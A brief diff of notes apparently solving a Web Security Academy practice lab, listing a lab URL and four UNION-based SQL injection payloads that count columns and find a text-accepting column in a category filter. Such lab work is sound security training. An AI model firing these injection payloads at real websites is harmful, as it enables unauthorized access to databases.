@@ -1,0 +1,11 @@
+
+https://0a25002f03ae58dbc181365a003e0058.web-security-academy.net/filter?category=Accessories
+
+/filter?category=Accessories'union select null,null,null--
+
+/filter?category=Accessories'union select 'a',null,null--
+
+/filter?category=Accessories'union select null,'a',null--
+
+/filter?category=Accessories'union select null,'sQFhqf',null--
+
